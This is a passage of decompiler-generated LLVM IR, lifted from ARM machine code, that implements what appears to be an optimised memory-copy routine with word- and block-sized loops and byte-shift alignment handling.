dec_label_pc_2d5c0:                               ; preds = %dec_label_pc_2d5c0.loopexit, %dec_label_pc_2d59c
  %v0_2d47c60 = phi i32 [ %v1_2d5b8, %dec_label_pc_2d5c0.loopexit ], [ %v1_2d5a0, %dec_label_pc_2d59c ]
  %v0_2d5c0 = load i32, i32* %r1.global-to-local, align 4
  %v1_2d5c0 = add i32 %v0_2d5c0, -2
  store i32 %v1_2d5c0, i32* %r1.global-to-local, align 4
  br label %bb141

dec_label_pc_2d5c8:                               ; preds = %dec_label_pc_2d4dc
  br i1 %v2_2d560, label %dec_label_pc_2d614, label %dec_label_pc_2d5d0

dec_label_pc_2d5d0:                               ; preds = %dec_label_pc_2d5c8
  store i32 %v1_2d55c, i32* %r2.global-to-local, align 4
  %v3_2d5d4 = load i32, i32* @r4, align 4
  store i32 %v3_2d5d4, i32* %stack_var_-16, align 4
  %v6_2d5d4 = load i32, i32* @r5, align 4
  store i32 %v6_2d5d4, i32* %stack_var_-12, align 4
  br label %dec_label_pc_2d5d8

dec_label_pc_2d5d8:                               ; preds = %dec_label_pc_2d5d8.dec_label_pc_2d5d8_crit_edge, %dec_label_pc_2d5d0
  %v0_2d5fc = phi i32 [ %v12_2d5fc, %dec_label_pc_2d5d8.dec_label_pc_2d5d8_crit_edge ], [ %v0_2d5fc76, %dec_label_pc_2d5d0 ]
  %v0_2d5dc = phi i32 [ %v0_2d5dc.pre, %dec_label_pc_2d5d8.dec_label_pc_2d5d8_crit_edge ], [ %v4_2d4e0, %dec_label_pc_2d5d0 ]
  %v0_2d5d8 = phi i32 [ %v0_2d5d8.pre, %dec_label_pc_2d5d8.dec_label_pc_2d5d8_crit_edge ], [ %v2_2d4e0, %dec_label_pc_2d5d0 ]
  %v3_2d5d8 = udiv i32 %v0_2d5d8, 16777216
  %v1_2d5dc = inttoptr i32 %v0_2d5dc to i32*
  %v2_2d5dc = load i32, i32* %v1_2d5dc, align 4
  store i32 %v2_2d5dc, i32* %r4.global-to-local, align 4
  %v3_2d5dc = add i32 %v0_2d5dc, 4
  %v4_2d5dc = inttoptr i32 %v3_2d5dc to i32*
  %v5_2d5dc = load i32, i32* %v4_2d5dc, align 4
  store i32 %v5_2d5dc, i32* %r5.global-to-local, align 4
  %v6_2d5dc = add i32 %v0_2d5dc, 8
  %v7_2d5dc = inttoptr i32 %v6_2d5dc to i32*
  %v8_2d5dc = load i32, i32* %v7_2d5dc, align 4
  store i32 %v8_2d5dc, i32* %ip.global-to-local, align 4
  %v9_2d5dc = add i32 %v0_2d5dc, 12
  %v10_2d5dc = inttoptr i32 %v9_2d5dc to i32*
  %v11_2d5dc = load i32, i32* %v10_2d5dc, align 4
  store i32 %v11_2d5dc, i32* %lr.global-to-local, align 4
  %v12_2d5dc = add i32 %v0_2d5dc, 16
  store i32 %v12_2d5dc, i32* %r1.global-to-local, align 4
  %v4_2d5e0 = mul i32 %v2_2d5dc, 256
  %v5_2d5e0 = or i32 %v4_2d5e0, %v3_2d5d8
  store i32 %v5_2d5e0, i32* @r3, align 4
  %v3_2d5e4 = udiv i32 %v2_2d5dc, 16777216
  %v4_2d5e8 = mul i32 %v5_2d5dc, 256
  %v5_2d5e8 = or i32 %v4_2d5e8, %v3_2d5e4
  store i32 %v5_2d5e8, i32* %r4.global-to-local, align 4
  %v3_2d5ec = udiv i32 %v5_2d5dc, 16777216
  %v4_2d5f0 = mul i32 %v8_2d5dc, 256
  %v5_2d5f0 = or i32 %v4_2d5f0, %v3_2d5ec
  store i32 %v5_2d5f0, i32* %r5.global-to-local, align 4
  %v3_2d5f4 = udiv i32 %v8_2d5dc, 16777216
  %v4_2d5f8 = mul i32 %v11_2d5dc, 256
  %v5_2d5f8 = or i32 %v4_2d5f8, %v3_2d5f4
  store i32 %v5_2d5f8, i32* @ip, align 4
  %v1_2d5fc = inttoptr i32 %v0_2d5fc to i32*
  store i32 %v5_2d5e0, i32* %v1_2d5fc, align 4
  %v3_2d5fc = add i32 %v0_2d5fc, 4
  %v4_2d5fc = inttoptr i32 %v3_2d5fc to i32*
  %v5_2d5fc = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_2d5fc, i32* %v4_2d5fc, align 4
  %v6_2d5fc = add i32 %v0_2d5fc, 8
  %v7_2d5fc = inttoptr i32 %v6_2d5fc to i32*
  %v8_2d5fc = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_2d5fc, i32* %v7_2d5fc, align 4
  %v9_2d5fc = add i32 %v0_2d5fc, 12
  %v10_2d5fc = inttoptr i32 %v9_2d5fc to i32*
  %v11_2d5fc = load i32, i32* @ip, align 4
  store i32 %v11_2d5fc, i32* %v10_2d5fc, align 4
  %v12_2d5fc = add i32 %v0_2d5fc, 16
  store i32 %v12_2d5fc, i32* %r0.global-to-local, align 4
  %v0_2d600 = load i32, i32* %r2.global-to-local, align 4
  %v1_2d600 = add i32 %v0_2d600, -16
  store i32 %v1_2d600, i32* %r2.global-to-local, align 4
  %v3_2d600 = sub i32 15, %v0_2d600
  %v4_2d600 = and i32 %v3_2d600, %v0_2d600
  %v5_2d600 = icmp slt i32 %v4_2d600, 0
  %v6_2d600 = icmp slt i32 %v1_2d600, 0
  %v2_2d604 = xor i1 %v6_2d600, %v5_2d600
  br i1 %v2_2d604, label %dec_label_pc_2d608, label %dec_label_pc_2d5d8.dec_label_pc_2d5d8_crit_edge

dec_label_pc_2d5d8.dec_label_pc_2d5d8_crit_edge:  ; preds = %dec_label_pc_2d5d8
  %v0_2d5d8.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_2d5dc.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_2d5d8

dec_label_pc_2d608:                               ; preds = %dec_label_pc_2d5d8
  %v2_2d608 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_2d608, i32* @r4, align 4
  %v5_2d608 = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_2d608, i32* @r5, align 4
  %v1_2d60c = add i32 %v0_2d600, -4
  store i32 %v1_2d60c, i32* %r2.global-to-local, align 4
  %v3_2d60c = add i32 %v0_2d600, 2147483632
  %v4_2d60c = and i32 %v1_2d60c, %v3_2d60c
  %v5_2d60c = icmp slt i32 %v4_2d60c, 0
  store i1 %v5_2d60c, i1* %cpsr_v.global-to-local, align 1
  %v6_2d60c = icmp slt i32 %v1_2d60c, 0
  store i1 %v6_2d60c, i1* %cpsr_n.global-to-local, align 1
  %v7_2d60c = icmp eq i32 %v1_2d60c, 0
  store i1 %v7_2d60c, i1* %cpsr_z.global-to-local, align 1
  %v2_2d610 = xor i1 %v6_2d60c, %v5_2d60c
  br i1 %v2_2d610, label %dec_label_pc_2d62c, label %dec_label_pc_2d614

dec_label_pc_2d614:                               ; preds = %dec_label_pc_2d608, %dec_label_pc_2d5c8, %dec_label_pc_2d614
  %v1_2d620 = phi i32 [ %v4_2d620, %dec_label_pc_2d614 ], [ %v12_2d5fc, %dec_label_pc_2d608 ], [ %v0_2d5fc76, %dec_label_pc_2d5c8 ]
  %v0_2d614 = load i32, i32* %lr.global-to-local, align 4
  %v3_2d614 = udiv i32 %v0_2d614, 16777216
  store i32 %v3_2d614, i32* %ip.global-to-local, align 4
  %v0_2d618 = load i32, i32* %r1.global-to-local, align 4
  %v1_2d618 = inttoptr i32 %v0_2d618 to i32*
  %v2_2d618 = load i32, i32* %v1_2d618, align 4
  store i32 %v2_2d618, i32* %lr.global-to-local, align 4
  %v4_2d618 = add i32 %v0_2d618, 4
  store i32 %v4_2d618, i32* %r1.global-to-local, align 4
  %v4_2d61c = mul i32 %v2_2d618, 256
  %v5_2d61c = or i32 %v4_2d61c, %v3_2d614
  store i32 %v5_2d61c, i32* @ip, align 4
  %v2_2d620 = inttoptr i32 %v1_2d620 to i32*
  store i32 %v5_2d61c, i32* %v2_2d620, align 4
  %v3_2d620 = load i32, i32* %r0.global-to-local, align 4
  %v4_2d620 = add i32 %v3_2d620, 4
  store i32 %v4_2d620, i32* %r0.global-to-local, align 4
  %v0_2d624 = load i32, i32* %r2.global-to-local, align 4
  %v1_2d624 = add i32 %v0_2d624, -4
  store i32 %v1_2d624, i32* %r2.global-to-local, align 4
  %v3_2d624 = sub i32 3, %v0_2d624
  %v4_2d624 = and i32 %v3_2d624, %v0_2d624
  %v5_2d624 = icmp slt i32 %v4_2d624, 0
  %v6_2d624 = icmp slt i32 %v1_2d624, 0
  %v2_2d628 = xor i1 %v6_2d624, %v5_2d624
  br i1 %v2_2d628, label %dec_label_pc_2d62c.loopexit, label %dec_label_pc_2d614

dec_label_pc_2d62c.loopexit:                      ; preds = %dec_label_pc_2d614
  %v7_2d624 = icmp eq i32 %v0_2d624, 4
  store i1 %v5_2d624, i1* %cpsr_v.global-to-local, align 1
  store i1 %v6_2d624, i1* %cpsr_n.global-to-local, align 1
  store i1 %v7_2d624, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_2d62c

dec_label_pc_2d62c:                               ; preds = %dec_label_pc_2d62c.loopexit, %dec_label_pc_2d608
  %v0_2d47c61 = phi i32 [ %v1_2d624, %dec_label_pc_2d62c.loopexit ], [ %v1_2d60c, %dec_label_pc_2d608 ]
  %v0_2d62c = load i32, i32* %r1.global-to-local, align 4
  %v1_2d62c = add i32 %v0_2d62c, -1
  store i32 %v1_2d62c, i32* %r1.global-to-local, align 4
  br label %bb141

dec_label_pc_2d634:                               ; preds = %entry
  %v1_2d634 = load i32, i32* @r2, align 4
  %v2_2d634 = add i32 %v1_2d634, %v0_2d3e0
  store i32 %v2_2d634, i32* %r1.global-to-local, align 4
  %v2_2d638 = add i32 %v1_2d634, %v1_2d3e0
  store i32 %v2_2d638, i32* %r0.global-to-local, align 4
  %v2_2d63c = add i32 %v1_2d634, -4
  store i32 %v2_2d63c, i32* %r2.global-to-local, align 4
  %v4_2d63c = sub i32 3, %v1_2d634
  %v5_2d63c = and i32 %v4_2d63c, %v1_2d634
  %v6_2d63c = icmp slt i32 %v5_2d63c, 0
  store i1 %v6_2d63c, i1* %cpsr_v.global-to-local, align 1
  %v7_2d63c = icmp slt i32 %v2_2d63c, 0
  store i1 %v7_2d63c, i1* %cpsr_n.global-to-local, align 1
  %v8_2d63c = icmp eq i32 %v1_2d634, 4
  store i1 %v8_2d63c, i1* %cpsr_z.global-to-local, align 1
  %v5_2d640 = icmp slt i32 %v1_2d634, 4
  br i1 %v5_2d640, label %bb151, label %dec_label_pc_2d644

dec_label_pc_2d644:                               ; preds = %dec_label_pc_2d634
  %v1_2d644 = urem i32 %v2_2d638, 4
  store i32 %v1_2d644, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_2d644 = icmp eq i32 %v1_2d644, 0
  store i1 %v2_2d644, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_2d644, label %dec_label_pc_2d64c, label %dec_label_pc_2d6ec

dec_label_pc_2d64c:                               ; preds = %dec_label_pc_2d644
  %v1_2d64c = urem i32 %v2_2d634, 4
  store i32 %v1_2d64c, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_2d64c = icmp eq i32 %v1_2d64c, 0
  store i1 %v2_2d64c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_2d64c, label %dec_label_pc_2d654, label %dec_label_pc_2d718

dec_label_pc_2d654:                               ; preds = %dec_label_pc_2d64c, %dec_label_pc_2d710
  %v0_2d66c37 = phi i32 [ %v2_2d638, %dec_label_pc_2d64c ], [ %v0_2d76020, %dec_label_pc_2d710 ]
  %v0_2d66836 = phi i32 [ %v2_2d634, %dec_label_pc_2d64c ], [ %v0_2d710, %dec_label_pc_2d710 ]
  %v0_2d654 = phi i32 [ %v2_2d63c, %dec_label_pc_2d64c ], [ %v2_2d708, %dec_label_pc_2d710 ]
  %v2_2d654 = add i32 %v0_2d654, -8
  store i32 %v2_2d654, i32* %r2.global-to-local, align 4
  %v4_2d654 = sub i32 7, %v0_2d654
  %v5_2d654 = and i32 %v4_2d654, %v0_2d654
  %v6_2d654 = icmp slt i32 %v5_2d654, 0
  store i1 %v6_2d654, i1* %cpsr_v.global-to-local, align 1
  %v7_2d654 = icmp slt i32 %v2_2d654, 0
  store i1 %v7_2d654, i1* %cpsr_n.global-to-local, align 1
  %v8_2d654 = icmp eq i32 %v0_2d654, 8
  store i1 %v8_2d654, i1* %cpsr_z.global-to-local, align 1
  %v5_2d658 = icmp slt i32 %v0_2d654, 8
  br i1 %v5_2d658, label %dec_label_pc_2d6a4, label %dec_label_pc_2d65c

dec_label_pc_2d65c:                               ; preds = %dec_label_pc_2d654
  %v3_2d65c = load i32, i32* @r4, align 4
  %v5_2d65c = inttoptr i32 %v3_2d65c to i8*
  store i8* %v5_2d65c, i8** %stack_var_-8, align 4
  %v8_2d65c = load i32, i32* @lr, align 4
  %v2_2d660 = add i32 %v0_2d654, -28
  store i32 %v2_2d660, i32* %r2.global-to-local, align 4
  %v4_2d660 = sub i32 27, %v0_2d654
  %v5_2d660 = and i32 %v4_2d660, %v2_2d654
  %v6_2d660 = icmp slt i32 %v5_2d660, 0
  store i1 %v6_2d660, i1* %cpsr_v.global-to-local, align 1
  %v7_2d660 = icmp slt i32 %v2_2d660, 0
  store i1 %v7_2d660, i1* %cpsr_n.global-to-local, align 1
  %v8_2d660 = icmp eq i32 %v2_2d654, 20
  store i1 %v8_2d660, i1* %cpsr_z.global-to-local, align 1
  %v5_2d664 = icmp slt i32 %v2_2d654, 20
  br i1 %v5_2d664, label %dec_label_pc_2d680, label %dec_label_pc_2d668

dec_label_pc_2d668:                               ; preds = %dec_label_pc_2d65c, %dec_label_pc_2d668.dec_label_pc_2d668_crit_edge
  %v0_2d66c = phi i32 [ %v1_2d674, %dec_label_pc_2d668.dec_label_pc_2d668_crit_edge ], [ %v0_2d66c37, %dec_label_pc_2d65c ]
  %v0_2d668 = phi i32 [ %v0_2d668.pre, %dec_label_pc_2d668.dec_label_pc_2d668_crit_edge ], [ %v0_2d66836, %dec_label_pc_2d65c ]
  %v1_2d668 = add i32 %v0_2d668, -4
  %v2_2d668 = inttoptr i32 %v1_2d668 to i32*
  %v3_2d668 = load i32, i32* %v2_2d668, align 4
  %v4_2d668 = add i32 %v0_2d668, -8
  %v5_2d668 = inttoptr i32 %v4_2d668 to i32*
  %v6_2d668 = load i32, i32* %v5_2d668, align 4
  store i32 %v6_2d668, i32* %r4.global-to-local, align 4
  %v7_2d668 = add i32 %v0_2d668, -12
  %v8_2d668 = inttoptr i32 %v7_2d668 to i32*
  %v9_2d668 = load i32, i32* %v8_2d668, align 4
  store i32 %v9_2d668, i32* %ip.global-to-local, align 4
  %v10_2d668 = add i32 %v0_2d668, -16
  %v11_2d668 = inttoptr i32 %v10_2d668 to i32*
  %v12_2d668 = load i32, i32* %v11_2d668, align 4
  store i32 %v12_2d668, i32* %lr.global-to-local, align 4
  store i32 %v10_2d668, i32* %r1.global-to-local, align 4
  %v1_2d66c = add i32 %v0_2d66c, -16
  %v2_2d66c = inttoptr i32 %v1_2d66c to i32*
  store i32 %v3_2d668, i32* %v2_2d66c, align 4
  %v4_2d66c = add i32 %v0_2d66c, -12
  %v5_2d66c = inttoptr i32 %v4_2d66c to i32*
  %v6_2d66c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v6_2d66c, i32* %v5_2d66c, align 4
  %v7_2d66c = add i32 %v0_2d66c, -8
  %v8_2d66c = inttoptr i32 %v7_2d66c to i32*
  %v9_2d66c = load i32, i32* %ip.global-to-local, align 4
  store i32 %v9_2d66c, i32* %v8_2d66c, align 4
  %v10_2d66c = add i32 %v0_2d66c, -4
  %v11_2d66c = inttoptr i32 %v10_2d66c to i32*
  %v12_2d66c = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_2d66c, i32* %v11_2d66c, align 4
  store i32 %v1_2d66c, i32* %r0.global-to-local, align 4
  %v0_2d670 = load i32, i32* %r1.global-to-local, align 4
  %v1_2d670 = add i32 %v0_2d670, -4
  %v2_2d670 = inttoptr i32 %v1_2d670 to i32*
  %v3_2d670 = load i32, i32* %v2_2d670, align 4
  store i32 %v3_2d670, i32* @r3, align 4
  %v4_2d670 = add i32 %v0_2d670, -8
  %v5_2d670 = inttoptr i32 %v4_2d670 to i32*
  %v6_2d670 = load i32, i32* %v5_2d670, align 4
  store i32 %v6_2d670, i32* %r4.global-to-local, align 4
  %v7_2d670 = add i32 %v0_2d670, -12
  %v8_2d670 = inttoptr i32 %v7_2d670 to i32*
  %v9_2d670 = load i32, i32* %v8_2d670, align 4
  store i32 %v9_2d670, i32* @ip, align 4
  %v10_2d670 = add i32 %v0_2d670, -16
  %v11_2d670 = inttoptr i32 %v10_2d670 to i32*
  %v12_2d670 = load i32, i32* %v11_2d670, align 4
  store i32 %v12_2d670, i32* %lr.global-to-local, align 4
  store i32 %v10_2d670, i32* %r1.global-to-local, align 4
  %v1_2d674 = add i32 %v0_2d66c, -32
  %v2_2d674 = inttoptr i32 %v1_2d674 to i32*
  store i32 %v3_2d670, i32* %v2_2d674, align 4
  %v4_2d674 = add i32 %v0_2d66c, -28
  %v5_2d674 = inttoptr i32 %v4_2d674 to i32*
  %v6_2d674 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v6_2d674, i32* %v5_2d674, align 4
  %v7_2d674 = add i32 %v0_2d66c, -24
  %v8_2d674 = inttoptr i32 %v7_2d674 to i32*
  %v9_2d674 = load i32, i32* @ip, align 4
  store i32 %v9_2d674, i32* %v8_2d674, align 4
  %v10_2d674 = add i32 %v0_2d66c, -20
  %v11_2d674 = inttoptr i32 %v10_2d674 to i32*
  %v12_2d674 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_2d674, i32* %v11_2d674, align 4
  store i32 %v1_2d674, i32* %r0.global-to-local, align 4
  %v0_2d678 = load i32, i32* %r2.global-to-local, align 4
  %v2_2d678 = add i32 %v0_2d678, -32
  store i32 %v2_2d678, i32* %r2.global-to-local, align 4
  %v6_2d67c = icmp slt i32 %v0_2d678, 32
  br i1 %v6_2d67c, label %dec_label_pc_2d680.loopexit, label %dec_label_pc_2d668.dec_label_pc_2d668_crit_edge

dec_label_pc_2d668.dec_label_pc_2d668_crit_edge:  ; preds = %dec_label_pc_2d668
  %v0_2d668.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_2d668

dec_label_pc_2d680.loopexit:                      ; preds = %dec_label_pc_2d668
  %v4_2d678 = sub i32 31, %v0_2d678
  %v5_2d678 = and i32 %v4_2d678, %v0_2d678
  %v6_2d678 = icmp slt i32 %v5_2d678, 0
  %v7_2d678 = icmp slt i32 %v2_2d678, 0
  store i1 %v6_2d678, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_2d678, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_2d680

dec_label_pc_2d680:                               ; preds = %dec_label_pc_2d680.loopexit, %dec_label_pc_2d65c
  %v6_2d688 = phi i32 [ %v1_2d674, %dec_label_pc_2d680.loopexit ], [ %v0_2d66c37, %dec_label_pc_2d65c ]
  %v0_2d690.pr = phi i32 [ %v2_2d678, %dec_label_pc_2d680.loopexit ], [ %v2_2d660, %dec_label_pc_2d65c ]
  %v4_2d680 = add i32 %v0_2d690.pr, 16
  %v6_2d680 = sub i32 0, %v0_2d690.pr
  %v7_2d680 = and i32 %v4_2d680, %v6_2d680
  %v8_2d680 = icmp slt i32 %v7_2d680, 0
  store i1 %v8_2d680, i1* %cpsr_v.global-to-local, align 1
  %v9_2d680 = icmp slt i32 %v4_2d680, 0
  store i1 %v9_2d680, i1* %cpsr_n.global-to-local, align 1
  %v10_2d680 = icmp eq i32 %v4_2d680, 0
  store i1 %v10_2d680, i1* %cpsr_z.global-to-local, align 1
  %v5_2d684 = icmp slt i32 %v0_2d690.pr, -16
  br i1 %v5_2d684, label %.thread2, label %bb148

bb148:                                            ; preds = %dec_label_pc_2d680
  %v6_2d684 = load i32, i32* %r1.global-to-local, align 4
  %v7_2d684 = add i32 %v6_2d684, -4
  %v8_2d684 = inttoptr i32 %v7_2d684 to i32*
  %v9_2d684 = load i32, i32* %v8_2d684, align 4
  store i32 %v9_2d684, i32* @r3, align 4
  %v10_2d684 = add i32 %v6_2d684, -8
  %v11_2d684 = inttoptr i32 %v10_2d684 to i32*
  %v12_2d684 = load i32, i32* %v11_2d684, align 4
  store i32 %v12_2d684, i32* %r4.global-to-local, align 4
  %v13_2d684 = add i32 %v6_2d684, -12
  %v14_2d684 = inttoptr i32 %v13_2d684 to i32*
  %v15_2d684 = load i32, i32* %v14_2d684, align 4
  store i32 %v15_2d684, i32* @ip, align 4
  %v16_2d684 = add i32 %v6_2d684, -16
  %v17_2d684 = inttoptr i32 %v16_2d684 to i32*
  %v18_2d684 = load i32, i32* %v17_2d684, align 4
  store i32 %v18_2d684, i32* %lr.global-to-local, align 4
  store i32 %v16_2d684, i32* %r1.global-to-local, align 4
  %v7_2d688 = add i32 %v6_2d688, -16
  %v8_2d688 = inttoptr i32 %v7_2d688 to i32*
  store i32 %v9_2d684, i32* %v8_2d688, align 4
  %v10_2d688 = add i32 %v6_2d688, -12
  %v11_2d688 = inttoptr i32 %v10_2d688 to i32*
  %v12_2d688 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v12_2d688, i32* %v11_2d688, align 4
  %v13_2d688 = add i32 %v6_2d688, -8
  %v14_2d688 = inttoptr i32 %v13_2d688 to i32*
  %v15_2d688 = load i32, i32* @ip, align 4
  store i32 %v15_2d688, i32* %v14_2d688, align 4
  %v16_2d688 = add i32 %v6_2d688, -4
  %v17_2d688 = inttoptr i32 %v16_2d688 to i32*
  %v18_2d688 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v18_2d688, i32* %v17_2d688, align 4
  store i32 %v7_2d688, i32* %r0.global-to-local, align 4
  %v6_2d68c = load i32, i32* %r2.global-to-local, align 4
  %v7_2d68c = add i32 %v6_2d68c, -16
  store i32 %v7_2d68c, i32* %r2.global-to-local, align 4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_2d680, %bb148
  %v6_2d698 = phi i32 [ %v7_2d688, %bb148 ], [ %v6_2d688, %dec_label_pc_2d680 ]
  %v0_2d690 = phi i32 [ %v7_2d68c, %bb148 ], [ %v0_2d690.pr, %dec_label_pc_2d680 ]
  %v4_2d690 = add i32 %v0_2d690, 20
  store i32 %v4_2d690, i32* %r2.global-to-local, align 4
  %v6_2d690 = sub i32 0, %v0_2d690
  %v7_2d690 = and i32 %v4_2d690, %v6_2d690
  %v8_2d690 = icmp slt i32 %v7_2d690, 0
  store i1 %v8_2d690, i1* %cpsr_v.global-to-local, align 1
  %v9_2d690 = icmp slt i32 %v4_2d690, 0
  store i1 %v9_2d690, i1* %cpsr_n.global-to-local, align 1
  %v10_2d690 = icmp eq i32 %v4_2d690, 0
  store i1 %v10_2d690, i1* %cpsr_z.global-to-local, align 1
  %v5_2d694 = icmp slt i32 %v0_2d690, -20
  br i1 %v5_2d694, label %.thread4, label %bb149

bb149:                                            ; preds = %.thread2
  %v6_2d694 = load i32, i32* %r1.global-to-local, align 4
  %v7_2d694 = add i32 %v6_2d694, -4
  %v8_2d694 = inttoptr i32 %v7_2d694 to i32*
  %v9_2d694 = load i32, i32* %v8_2d694, align 4
  store i32 %v9_2d694, i32* @r3, align 4
  %v10_2d694 = add i32 %v6_2d694, -8
  %v11_2d694 = inttoptr i32 %v10_2d694 to i32*
  %v12_2d694 = load i32, i32* %v11_2d694, align 4
  store i32 %v12_2d694, i32* @ip, align 4
  %v13_2d694 = add i32 %v6_2d694, -12
  %v14_2d694 = inttoptr i32 %v13_2d694 to i32*
  %v15_2d694 = load i32, i32* %v14_2d694, align 4
  store i32 %v15_2d694, i32* %lr.global-to-local, align 4
  store i32 %v13_2d694, i32* %r1.global-to-local, align 4
  %v7_2d698 = add i32 %v6_2d698, -12
  %v8_2d698 = inttoptr i32 %v7_2d698 to i32*
  store i32 %v9_2d694, i32* %v8_2d698, align 4
  %v10_2d698 = add i32 %v6_2d698, -8
  %v11_2d698 = inttoptr i32 %v10_2d698 to i32*
  %v12_2d698 = load i32, i32* @ip, align 4
  store i32 %v12_2d698, i32* %v11_2d698, align 4
  %v13_2d698 = add i32 %v6_2d698, -4
  %v14_2d698 = inttoptr i32 %v13_2d698 to i32*
  %v15_2d698 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v15_2d698, i32* %v14_2d698, align 4
  store i32 %v7_2d698, i32* %r0.global-to-local, align 4
  %v6_2d69c = load i32, i32* %r2.global-to-local, align 4
  %v7_2d69c = add i32 %v6_2d69c, -12
  store i32 %v7_2d69c, i32* %r2.global-to-local, align 4
  br label %.thread4

.thread4:                                         ; preds = %.thread2, %bb149
  %v6_2d6bc45 = phi i32 [ %v6_2d698, %.thread2 ], [ %v7_2d698, %bb149 ]
  %v0_2d6a443 = phi i32 [ %v4_2d690, %.thread2 ], [ %v7_2d69c, %bb149 ]
  %v2_2d6a0 = load i8*, i8** %stack_var_-8, align 4
  %v3_2d6a0 = ptrtoint i8* %v2_2d6a0 to i32
  store i32 %v3_2d6a0, i32* @r4, align 4
  store i32 %v8_2d65c, i32* @lr, align 4
  br label %dec_label_pc_2d6a4

dec_label_pc_2d6a4:                               ; preds = %dec_label_pc_2d654, %.thread4
  %v7_2d6b4 = phi i32 [ %v0_2d66c37, %dec_label_pc_2d654 ], [ %v6_2d6bc45, %.thread4 ]
  %v0_2d6a4 = phi i32 [ %v2_2d654, %dec_label_pc_2d654 ], [ %v0_2d6a443, %.thread4 ]
  %v2_2d6a4 = add i32 %v0_2d6a4, 8
  store i32 %v2_2d6a4, i32* %r2.global-to-local, align 4
  %v4_2d6a4 = sub i32 0, %v0_2d6a4
  %v5_2d6a4 = and i32 %v2_2d6a4, %v4_2d6a4
  %v6_2d6a4 = icmp slt i32 %v5_2d6a4, 0
  store i1 %v6_2d6a4, i1* %cpsr_v.global-to-local, align 1
  %v7_2d6a4 = icmp slt i32 %v2_2d6a4, 0
  store i1 %v7_2d6a4, i1* %cpsr_n.global-to-local, align 1
  %v8_2d6a4 = icmp eq i32 %v2_2d6a4, 0
  store i1 %v8_2d6a4, i1* %cpsr_z.global-to-local, align 1
  %v5_2d6a8 = icmp slt i32 %v0_2d6a4, -8
  br i1 %v5_2d6a8, label %bb151, label %dec_label_pc_2d6ac

dec_label_pc_2d6ac:                               ; preds = %dec_label_pc_2d6a4
  %v6_2d6ac = add i32 %v0_2d6a4, 4
  store i32 %v6_2d6ac, i32* %r2.global-to-local, align 4
  %v8_2d6ac = sub i32 -5, %v0_2d6a4
  %v9_2d6ac = and i32 %v8_2d6ac, %v2_2d6a4
  %v10_2d6ac = icmp slt i32 %v9_2d6ac, 0
  store i1 %v10_2d6ac, i1* %cpsr_v.global-to-local, align 1
  %v11_2d6ac = icmp slt i32 %v6_2d6ac, 0
  store i1 %v11_2d6ac, i1* %cpsr_n.global-to-local, align 1
  %v12_2d6ac = icmp eq i32 %v2_2d6a4, 4
  store i1 %v12_2d6ac, i1* %cpsr_z.global-to-local, align 1
  %v5_2d6b0 = icmp slt i32 %v2_2d6a4, 4
  %v6_2d6b0 = load i32, i32* %r1.global-to-local, align 4
  %v7_2d6b0 = add i32 %v6_2d6b0, -4
  %v8_2d6b0 = inttoptr i32 %v7_2d6b0 to i32*
  %v9_2d6b0 = load i32, i32* %v8_2d6b0, align 4
  store i32 %v9_2d6b0, i32* @r3, align 4
  br i1 %v5_2d6b0, label %.thread8, label %bb150

.thread8:                                         ; preds = %dec_label_pc_2d6ac
  store i32 %v7_2d6b0, i32* %r1.global-to-local, align 4
  %v8_2d6b4 = add i32 %v7_2d6b4, -4
  %v9_2d6b4 = inttoptr i32 %v8_2d6b4 to i32*
  store i32 %v9_2d6b0, i32* %v9_2d6b4, align 4
  %v10_2d6b4 = load i32, i32* %r0.global-to-local, align 4
  %v11_2d6b4 = add i32 %v10_2d6b4, -4
  store i32 %v11_2d6b4, i32* %r0.global-to-local, align 4
  %v0_2d6c4.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb151

bb150:                                            ; preds = %dec_label_pc_2d6ac
  %v10_2d6b8 = add i32 %v6_2d6b0, -8
  %v11_2d6b8 = inttoptr i32 %v10_2d6b8 to i32*
  %v12_2d6b8 = load i32, i32* %v11_2d6b8, align 4
  store i32 %v12_2d6b8, i32* @ip, align 4
  store i32 %v10_2d6b8, i32* %r1.global-to-local, align 4
  %v7_2d6bc = add i32 %v7_2d6b4, -8
  %v8_2d6bc = inttoptr i32 %v7_2d6bc to i32*
  store i32 %v9_2d6b0, i32* %v8_2d6bc, align 4
  %v10_2d6bc = add i32 %v7_2d6b4, -4
  %v11_2d6bc = inttoptr i32 %v10_2d6bc to i32*
  %v12_2d6bc = load i32, i32* @ip, align 4
  store i32 %v12_2d6bc, i32* %v11_2d6bc, align 4
  store i32 %v7_2d6bc, i32* %r0.global-to-local, align 4
  %v6_2d6c0 = load i32, i32* %r2.global-to-local, align 4
  %v7_2d6c0 = add i32 %v6_2d6c0, -4
  store i32 %v7_2d6c0, i32* %r2.global-to-local, align 4
  br label %bb151

bb151:                                            ; preds = %.thread8, %.thread14, %dec_label_pc_2d6a4, %dec_label_pc_2d634, %dec_label_pc_2d868, %dec_label_pc_2d7fc, %dec_label_pc_2d790, %bb150
